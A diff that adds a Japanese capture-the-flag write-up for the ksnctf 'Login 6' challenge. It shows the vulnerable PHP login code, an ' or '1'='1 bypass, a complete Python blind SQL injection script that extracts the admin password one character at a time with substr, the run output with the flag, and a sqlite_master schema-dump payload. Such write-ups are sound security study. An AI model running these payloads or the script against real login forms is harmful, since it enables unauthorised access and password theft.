@@ -995,6 +995,157 @@ Internal Server error
 ' || (SELECT group_concat(sql) FROM sqlite_master) || '
 CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
 ```
+## ksnctf
+### blind Injection / SQLite3 (Login 6)
+http://ctfq.sweetduet.info:10080/~q6/  
+idとpassの入力フォームがあって、`admin`としてログインしたい。  
+`' or '1'='1`でログイン成功したが、以下のソースが表示されて、adminのパスワードを特定する必要がある。  
+```txt
+Congratulations!
+It's too easy?
+Don't worry.
+The flag is admin's password.
+
+Hint:
+<?php
+    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
+    
+    $id = isset($_POST['id']) ? $_POST['id'] : '';
+    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
+    $login = false;
+    $err = '';
+    
+    if ($id!=='')
+    {
+        $db = new PDO('sqlite:database.db');
+        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
+        $login = $r && $r->fetch();
+        if (!$login)
+            $err = 'Login Failed';
+    }
+?><!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
+  </head>
+  <body>
+    <?php if (!$login) { ?>
+    <p>
+      First, login as "admin".
+    </p>
+    <div style="font-weight:bold; color:red">
+      <?php echo h($err); ?>
+    </div>
+    <form method="POST">
+      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
+      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
+      <div><input type="submit"></div>
+    </form>
+    <?php } else { ?>
+    <p>
+      Congratulations!<br>
+      It's too easy?<br>
+      Don't worry.<br>
+      The flag is admin's password.<br>
+      <br>
+      Hint:<br>
+    </p>
+    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
+    <?php } ?>
+  </body>
+</html>
+```
+Sqliteを使っていることがわかる。Blindでadminのpasswordを特定する。  
+```python
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+
+import os
+import requests
+import urllib.parse
+
+url = "http://ctfq.sweetduet.info:10080/~q6/"
+cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
+candidates = [chr(i) for i in range(48, 48+10)] + \
+    [chr(i) for i in range(97, 97+26)] + \
+    [chr(i) for i in range(65, 65+26)] + \
+    ["."," ","-","+","_",":","<",">",";","'","\"","(",")","=","{","}","[","]","\\","|","/","@","$","!","?","&","#"]
+headers= {'Cookie':'PHPSESSID='+cookie}
+
+def attack(attack_sql):
+    attack_url = url
+    data = "id=" + urllib.parse.quote(attack_sql) + "&pass=" + urllib.parse.quote("pass")
+    #print(data)
+    headers.update([('Content-Type','application/x-www-form-urlencoded')])
+    res = requests.post(attack_url, headers=headers,verify=False,data=data)
+    #print(res.text)
+    return res
+
+def create_pass_query(pw):
+    # admin' and substr(pass,1,1)='f' -- -
+    query = "admin' and substr(pass," + str(len(pw)) + ",1)='"+pw[-1]+"' -- -"
+    print(query)
+    return query
+
+def check_result(res):
+    if 'Congratulations!' in res.text:
+        return True
+    return False
+
+####################
+###     main     ###
+####################
+
+# find pw
+fix_pass = ""
+is_end = False
+while not is_end:
+    for c in candidates:
+        try_pass = fix_pass + str(c)
+        print(try_pass)
+        query = create_pass_query(try_pass)
+        res = attack(query)
+        if check_result(res):
+            fix_pass += c
+            break
+        if c == '#':
+            is_end = True
+            
+
+print("result: " + fix_pass)
+```
+`substr`を使うとFlagゲット！  
+```txt
+$ python3 exploit-substr.py
+
+
+admin' and substr(pass,22,1)='!' -- -
+FLAG_KpWa4ji3uZk6TrPK?
+admin' and substr(pass,22,1)='?' -- -
+FLAG_KpWa4ji3uZk6TrPK&
+admin' and substr(pass,22,1)='&' -- -
+FLAG_KpWa4ji3uZk6TrPK#
+admin' and substr(pass,22,1)='#' -- -
+result: FLAG_KpWa4ji3uZk6TrPK
+```
+ちなみに、SQLite3では`like`を使うと大文字小文字を区別せず、`=`を使えば区別する。  
+MySQLでは`like`も`=`も両方区別しない。  
+https://sutara-lumpur.hatenadiary.org/entry/20120818/1345280287#20120818_4  
+したがって、以下のような`like`を使ったBlindでは全部小文字のFlagになって正常なFlagが得られない。  
+```python
+def create_pass_query(pw):
+    query = "admin' and pass like '" + pw + "%' -- -"
+    print(query)
+    return query
+```
+以下は全部小文字になってしまってるFlag。  
+```txt
+admin' and pass like 'flag_kpwa4ji3uzk6trpk&%' -- -
+flag_kpwa4ji3uzk6trpk#
+admin' and pass like 'flag_kpwa4ji3uzk6trpk#%' -- -
+result: flag_kpwa4ji3uzk6trpk
+```
 ## wargame.kr
 ### inject into order by / blind Injection (dbms335)
 https://taiyakon.com/2017/09/ctfwargamekr-19-dbms335writeup.html  
